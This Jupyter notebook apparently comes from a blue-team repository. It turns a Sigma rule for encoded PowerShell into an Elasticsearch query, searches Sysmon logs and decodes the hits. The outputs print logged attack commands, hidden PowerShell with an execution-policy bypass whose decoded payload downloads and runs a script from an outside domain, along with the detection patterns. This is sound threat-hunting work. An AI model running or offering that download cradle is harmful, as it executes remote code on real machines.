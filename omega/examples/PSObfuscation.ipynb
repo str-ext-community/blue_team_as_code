{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Hunting detection #1"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {},
   "outputs": [],
   "source": [
    "import sys,os\n",
    "os.chdir('../../')\n",
    "sys.path += [ os.path.abspath('../str-omega'), os.path.abspath('../str-omega/sigma/tools')]\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Import Libraries and convert detection to SIEM query"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "{\n",
      "    \"query\": {\n",
      "        \"constant_score\": {\n",
      "            \"filter\": {\n",
      "                \"bool\": {\n",
      "                    \"must\": [\n",
      "                        {\n",
      "                            \"match_phrase\": {\n",
      "                                \"event_id\": \"1\"\n",
      "                            }\n",
      "                        },\n",
      "                        {\n",
      "                            \"wildcard\": {\n",
      "                                \"process_command_line.keyword\": \"* -e*\"\n",
      "                            }\n",
      "                        },\n",
      "                        {\n",
      "                            \"bool\": {\n",
      "                                \"should\": [\n",
      "                                    {\n",
      "                                        \"wildcard\": {\n",
      "                                            \"process_command_line.keyword\": \"* jab*\"\n",
      "                                        }\n",
      "                                    },\n",
      "                                    {\n",
      "                                        \"wildcard\": {\n",
      "                                            \"process_command_line.keyword\": \"* sqbfafga*\"\n",
      "                                        }\n",
      "                                    }\n",
      "                                ]\n",
      "                            }\n",
      "                        }\n",
      "                    ]\n",
      "                }\n",
      "            }\n",
      "        }\n",
      "    }\n",
      "}\n"
     ]
    }
   ],
   "source": [
    "import json\n",
    "from sigma.config.collection import SigmaConfigurationManager\n",
    "from sigma.configuration import SigmaConfiguration, SigmaConfigurationChain\n",
    "from sigma.parser.collection import SigmaCollectionParser\n",
    "from sigma.backends.elasticsearch import ElastalertBackendQs\n",
    "\n",
    "from sigma.backends.elasticsearch import ElasticsearchDSLBackend\n",
    "\n",
    "\n",
    "class ConvertDetection(ElasticsearchDSLBackend):\n",
    "    def __init__(self, *args, **kwargs):\n",
    "        mapping, = args\n",
    "        with open(mapping, 'r') as stream:\n",
    "            self.sigmaconfigs = SigmaConfiguration(configyaml=stream)\n",
    "        super().__init__(self.sigmaconfigs, {})\n",
    "\n",
    "    def convert(self, a2b_file):\n",
    "        with open(a2b_file, 'r') as stream:\n",
    "            parser = SigmaCollectionParser(stream, self.sigmaconfigs, None)\n",
    "\n",
    "        parser.generate(self)\n",
    "        result = self.finalize()\n",
    "        return result\n",
    "        \n",
    "mapping = \"./Demo/RT-TOP5/detections/mapping.yml\"\n",
    "detection =  \"./Demo/RT-TOP5/detections/detection1.yml\"\n",
    "\n",
    "backend = ConvertDetection(mapping)\n",
    "query_txt = backend.convert(detection)\n",
    "query = json.loads(query_txt)\n",
    "print(json.dumps(\n",
    "    query,\n",
    "    sort_keys=True,\n",
    "    indent=4,\n",
    "    separators=(',', ': ')\n",
    "))\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Create connection to SIEM and run converted query"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Got 2 Hits\n"
     ]
    }
   ],
   "source": [
    "#!python3 -m pip install elasticsearch\n",
    "from elasticsearch import Elasticsearch\n",
    "es = Elasticsearch(['http://localhost:9200'])\n",
    "res = es.search(index=\"logs-endpoint-winevent-sysmon-*\", body=query)\n",
    "print(\"Got %d Hits\" % res['hits']['total']['value'])"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Check results "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "<style  type=\"text/css\" >\n",
       "#T_25631_row0_col0,#T_25631_row1_col0{\n",
       "            text-align:  left;\n",
       "        }</style><table id=\"T_25631_\" ><thead>    <tr>        <th class=\"blank level0\" ></th>        <th class=\"col_heading level0 col0\" >process_command_line</th>    </tr></thead><tbody>\n",
       "                <tr>\n",
       "                        <th id=\"T_25631_level0_row0\" class=\"row_heading level0 row0\" >0</th>\n",
       "                        <td id=\"T_25631_row0_col0\" class=\"data row0 col0\" >\"c:\\windows\\system32\\cmd.exe\" /c powershell -nop -w hidden -ep bypass -enc sqbfafgaiaaoae4azqb3ac0atwbiagoazqbjahqaiaboaguadaauafcazqbiagmababpaguabgb0ackalgbkag8adwbuagwabwbhagqacwb0ahiaaqbuagcakaaiaggadab0ahaaogavac8abgblahqadgbhagwabablahkaawblag4aeqbhac4aywbvag0alwbjahiabqauahaaaabwaciakqa=</td>\n",
       "            </tr>\n",
       "            <tr>\n",
       "                        <th id=\"T_25631_level0_row1\" class=\"row_heading level0 row1\" >1</th>\n",
       "                        <td id=\"T_25631_row1_col0\" class=\"data row1 col0\" >powershell  -nop -w hidden -ep bypass -enc sqbfafgaiaaoae4azqb3ac0atwbiagoazqbjahqaiaboaguadaauafcazqbiagmababpaguabgb0ackalgbkag8adwbuagwabwbhagqacwb0ahiaaqbuagcakaaiaggadab0ahaaogavac8abgblahqadgbhagwabablahkaawblag4aeqbhac4aywbvag0alwbjahiabqauahaaaabwaciakqa=</td>\n",
       "            </tr>\n",
       "    </tbody></table>"
      ],
      "text/plain": [
       "<pandas.io.formats.style.Styler at 0x7f9c105997f0>"
      ]
     },
     "execution_count": 4,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "from pandas import json_normalize\n",
    "import pandas as pd\n",
    "#pd.set_option('display.max_colwidth', None)\n",
    "\n",
    "df = json_normalize([x['_source'] for x in res['hits']['hits']])\n",
    "\n",
    "with pd.option_context('display.max_rows', None, 'display.max_columns', None, 'display.colheader_justify','light', 'display.width', 2000, 'display.max_colwidth', 500):\n",
    "    df_styled = df.copy()\n",
    "    df_styled = df_styled[['process_command_line']]\n",
    "    df_styled = df_styled.stack().str.lstrip().unstack()\n",
    "    df_styled = df_styled.style.set_properties(**{'text-align': 'left'})\n",
    "    \n",
    "df_styled"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Decode powershell base64 commands"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "<style  type=\"text/css\" >\n",
       "#T_809ab_row0_col0,#T_809ab_row0_col1,#T_809ab_row0_col2,#T_809ab_row1_col0,#T_809ab_row1_col1,#T_809ab_row1_col2{\n",
       "            text-align:  left;\n",
       "        }</style><table id=\"T_809ab_\" ><thead>    <tr>        <th class=\"blank level0\" ></th>        <th class=\"col_heading level0 col0\" >decoded</th>        <th class=\"col_heading level0 col1\" >process_command_line</th>        <th class=\"col_heading level0 col2\" >process_name</th>    </tr></thead><tbody>\n",
       "                <tr>\n",
       "                        <th id=\"T_809ab_level0_row0\" class=\"row_heading level0 row0\" >0</th>\n",
       "                        <td id=\"T_809ab_row0_col0\" class=\"data row0 col0\" >I\u0000E\u0000X\u0000 \u0000(\u0000N\u0000e\u0000w\u0000-\u0000O\u0000b\u0000j\u0000e\u0000c\u0000t\u0000 \u0000N\u0000e\u0000t\u0000.\u0000W\u0000e\u0000b\u0000c\u0000l\u0000i\u0000e\u0000n\u0000t\u0000)\u0000.\u0000d\u0000o\u0000w\u0000n\u0000l\u0000o\u0000a\u0000d\u0000s\u0000t\u0000r\u0000i\u0000n\u0000g\u0000(\u0000\"\u0000h\u0000t\u0000t\u0000p\u0000:\u0000/\u0000/\u0000n\u0000e\u0000t\u0000v\u0000a\u0000l\u0000l\u0000e\u0000y\u0000k\u0000e\u0000n\u0000y\u0000a\u0000.\u0000c\u0000o\u0000m\u0000/\u0000c\u0000r\u0000m\u0000.\u0000p\u0000h\u0000p\u0000\"\u0000)\u0000</td>\n",
       "                        <td id=\"T_809ab_row0_col1\" class=\"data row0 col1\" >\"c:\\windows\\system32\\cmd.exe\" /c powershell -nop -w hidden -ep bypass -enc sqbfafgaiaaoae4azqb3ac0atwbiagoazqbjahqaiaboaguadaauafcazqbiagmababpaguabgb0ackalgbkag8adwbuagwabwbhagqacwb0ahiaaqbuagcakaaiaggadab0ahaaogavac8abgblahqadgbhagwabablahkaawblag4aeqbhac4aywbvag0alwbjahiabqauahaaaabwaciakqa=</td>\n",
       "                        <td id=\"T_809ab_row0_col2\" class=\"data row0 col2\" >cmd.exe</td>\n",
       "            </tr>\n",
       "            <tr>\n",
       "                        <th id=\"T_809ab_level0_row1\" class=\"row_heading level0 row1\" >1</th>\n",
       "                        <td id=\"T_809ab_row1_col0\" class=\"data row1 col0\" >I\u0000E\u0000X\u0000 \u0000(\u0000N\u0000e\u0000w\u0000-\u0000O\u0000b\u0000j\u0000e\u0000c\u0000t\u0000 \u0000N\u0000e\u0000t\u0000.\u0000W\u0000e\u0000b\u0000c\u0000l\u0000i\u0000e\u0000n\u0000t\u0000)\u0000.\u0000d\u0000o\u0000w\u0000n\u0000l\u0000o\u0000a\u0000d\u0000s\u0000t\u0000r\u0000i\u0000n\u0000g\u0000(\u0000\"\u0000h\u0000t\u0000t\u0000p\u0000:\u0000/\u0000/\u0000n\u0000e\u0000t\u0000v\u0000a\u0000l\u0000l\u0000e\u0000y\u0000k\u0000e\u0000n\u0000y\u0000a\u0000.\u0000c\u0000o\u0000m\u0000/\u0000c\u0000r\u0000m\u0000.\u0000p\u0000h\u0000p\u0000\"\u0000)\u0000</td>\n",
       "                        <td id=\"T_809ab_row1_col1\" class=\"data row1 col1\" >powershell  -nop -w hidden -ep bypass -enc sqbfafgaiaaoae4azqb3ac0atwbiagoazqbjahqaiaboaguadaauafcazqbiagmababpaguabgb0ackalgbkag8adwbuagwabwbhagqacwb0ahiaaqbuagcakaaiaggadab0ahaaogavac8abgblahqadgbhagwabablahkaawblag4aeqbhac4aywbvag0alwbjahiabqauahaaaabwaciakqa=</td>\n",
       "                        <td id=\"T_809ab_row1_col2\" class=\"data row1 col2\" >powershell.exe</td>\n",
       "            </tr>\n",
       "    </tbody></table>"
      ],
      "text/plain": [
       "<pandas.io.formats.style.Styler at 0x7f9c1239c670>"
      ]
     },
     "execution_count": 5,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "import re\n",
    "import base64\n",
    "\n",
    "    \n",
    "def decode_b64(event):\n",
    "    _BASE64_REGEX = \"[A-Za-z0-9+\\\\n\\\\r]{30,}={0,2}\"\n",
    "    BASE64_REGEX_C = re.compile(_BASE64_REGEX, re.I | re.X)\n",
    "    b64match = BASE64_REGEX_C.search(event)\n",
    "    if b64match is None:\n",
    "        return \"-\"\n",
    "    b64_candidate = b64match[0]\n",
    "    return base64.b64decode(b64_candidate).decode('utf-8')    \n",
    "df['decoded'] = df.apply(lambda row: decode_b64(row['event_original_message']), axis=1)\n",
    "\n",
    "with pd.option_context('display.max_rows', None, 'display.max_columns', None, 'display.colheader_justify','light', 'display.width', 2000, 'display.max_colwidth', 500):\n",
    "    df = df[['decoded', 'process_command_line', 'process_name']]\n",
    "    df = df.stack().str.lstrip().unstack()\n",
    "    df = df.style.set_properties(**{'text-align': 'left'})\n",
    "    \n",
    "df\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.8.1"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 4
}
